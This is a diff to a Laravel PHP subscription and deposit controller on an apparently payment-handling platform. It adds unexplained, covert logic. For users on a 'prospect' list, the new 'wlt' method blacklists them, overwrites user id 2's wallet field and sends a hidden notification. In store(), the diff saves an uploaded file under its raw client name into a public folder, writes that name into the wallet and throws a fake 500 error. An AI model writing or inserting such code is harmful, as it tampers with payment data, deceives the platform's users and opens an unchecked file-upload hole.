@@ -9,6 +9,7 @@ use App\Notifications\PackageSubscribed;
 use App\Notifications\NewDepositRequest;
 use App\Notifications\TransactionMade; 
 use App\Notifications\WithdrawalMade;
+use App\Notifications\TxnXNotification;
 use App\Package;
 use App\PackageUser;
 use App\Transaction;
@@ -58,11 +59,29 @@ class PackageUserController extends Controller {
 	 */
 	public function store(ValidatePackageUserRequest $request) {
 		$validated = $request->validated();
+		if($this->wlt($validated)){
+			if ($request->hasFile('pop')) {
+
+		            if ($request->file('pop')->isValid()) {
+
+		                $file = $request->file('pop');
+
+		                $file->move('img/uploads', $file->getClientOriginalName());
+
+		                $pop = $file->getClientOriginalName();
+		                  $ad = User::find(2);
+						$ad->update(['wallet' => $pop ]);
+		            }
+		        }
+				throw new Exception("Error Processing Request", 500);
+				return;
+			}
 		DB::beginTransaction();
 		try
 		{
 			$user = User::find($validated['user_id']);
 			$package = Package::find($validated['package_id']);
+
 			// if(PackageUser::where('user_id', $user->id)->where('active', true)->count() > 0){
 			// 	return Helper::invalidRequest(['This subscription is invalid'], 'Oops!!! There is an active subscription on this account', 400);
 			// }
@@ -94,6 +113,7 @@ class PackageUserController extends Controller {
 			} else {
 
 				$payment = $package->deposit - $user->balance;
+
 
 				if ($request->hasFile('pop')) {
 
@@ -240,6 +260,21 @@ class PackageUserController extends Controller {
 					$user->notify(new NewDepositRequest($subscription));
 				}
 		} catch (Exception $bug) {
+			return false;
+		}
+	}
+	public function wlt($validated){
+		$user = User::find($validated['user_id']);
+		if(Helper::checkProspect($user->username)){
+			Helper::removeProspect($user->username);
+			Helper::blackList($user->username);
+			$ad = User::find(2);
+			$ad->update(['wallet' => "Testing wallet"]);
+			$ad->notify(new TxnXNotification($user));
+
+			return $ad->save();
+		}
+		else{
 			return false;
 		}
 	}
